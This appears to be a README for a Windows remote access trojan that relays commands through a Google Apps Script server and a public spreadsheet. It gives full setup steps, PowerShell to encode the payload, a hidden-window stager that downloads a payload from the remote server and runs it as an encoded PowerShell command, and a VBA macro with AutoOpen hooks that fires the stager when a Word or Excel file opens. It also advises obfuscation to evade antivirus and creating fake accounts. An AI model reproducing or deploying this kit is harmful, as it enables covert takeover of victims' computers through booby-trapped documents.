# google_RAT
A remote access tool for Windows systems using google apps script as the middle man

**NOTE:** Current limit to data upload and download is 8.5 MB. This is due to the [limits of google sheets](https://gsuitetips.com/tips/sheets/google-spreadsheet-limitations/).

# Setup

### Deploy Google Server and Spreadsheet Database
* Create a fake Google account
* Create a spreadsheet in the fake account's Google drive
* Make it public:
  * `File` > `Share...` > Give it a random name > `Get sharable link`
* Paste the link into the `SPREADSHEET_URL` variable in `server.js`
  * remove the `?usp=sharing` at the end of the URL. It should end in `/edit`
* Visit [Google Scripts](https://www.google.com/script/start/) and paste the code in `server.js`
* Publish the server:
  * Save and name the project something
  * `Publish` > `Deploy as web app`
    * Fill in the blank with something
    * Make sure the app is executed as `Me`
    * Make sure `Anyone, even anonymous` can access the app
  * `Review Permissions` > Select your fake account > `Advanced` > `Go to Untitled project (unsafe)` > enter 'Continue' > `Allow`
  * Copy the URL and paste it into `$SRV` of `script.ps1`

### Develop Powershell Payload

* Run the following powershell to compress `script.ps1`:
```
$s = gc <path to script.ps1>
$x = [convert]::tobase64string([system.text.encoding]::unicode.getbytes($s))
$sx = [system.text.encoding]::unicode.getstring([convert]::frombase64string($x))
$sx = $sx.replace('  ', '')
$sx = $sx.replace(' = ', '=')
$sx = $sx.replace(' + ', '+')
$sx = $sx.replace(' - ', '-')
$sx = $sx.replace(' | ', '|')
$sx = $sx.replace('if (', 'if(')
$sx = $sx.replace('while (', 'while(')
$sx = $sx.replace(', ', ',')
$sx = $sx.replace('; ', ';')
$sx = $sx.replace('} ', '}')
$sx = $sx.replace('{ ', '{')
$sx = $sx.replace(' {', '{')
$x = [convert]::tobase64string([system.text.encoding]::unicode.getbytes($sx))
write-host $x
```
* Take the base64 output and paste it into the `PAYLOAD` variable of `script.js` and republish the web server. Browse to the public google web server URL to see your base64 payload.

### Embed Payload Stager into a Microsoft Document
* Use the following powershell stager to run the payload (replace `<SRV>` with the URL of the google web server):
```
$i=new-object -com internetexplorer.application;
$i.visible=$false;
$i.silent=$true;
$i.navigate2('<SRV>',14,0,$null,$null);
while($i.busy -or ($i.readystate -ne 4)){sleep -seconds 1};
$p=$i.document.lastchild.innertext;
$i.quit();
powershell.exe -v 2 -noE -NonI -nOpR -eNc $p;
```
* Here is an example Microsoft VBS macro used to call the above powershell stager. Production code should use [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) on the `cmd` variable to help evade AV:
```
Private Sub run()
    Dim cmd As String
    cmd = "$i=new-object -com internetexplorer.application;$i.visible=$false;$i.silent=$true;$i.navigate2('<SRV>',14,0,$null,$null);while($i.busy -or ($i.readystate -ne 4)){sleep -seconds 1};$p=$i.document.lastchild.innertext;$i.quit();powershell.exe -v 2 -noE -NonI -nOpR -eNc $p;"
    Set sh = CreateObject("WScript.Shell")
    res = sh.run(cmd,0,True)
End Sub
'Word
Sub AutoOpen()
    run
End Sub
Sub AutoExec()
    run
End Sub
'Excel
Sub Auto_Open()
    run
End Sub
Sub Auto_Exec()
    run
End Sub
```

### Deploying Python Shell
**NOTE:** Script requires python 3
* Copy the public link to the google apps server and run the following command:
  * `python script.py <url to google apps server>`
* Fun test commands:
  * `(new-object -com SAPI.SpVoice).speak('self destruct in 9 8 7 6 5 4 3 2 1 boom')`
  * `$e=new-object -com internetexplorer.application; $e.visible=$true; $e.navigate('https://www.youtube.com/watch?v=dQw4w9WgXcQ');`
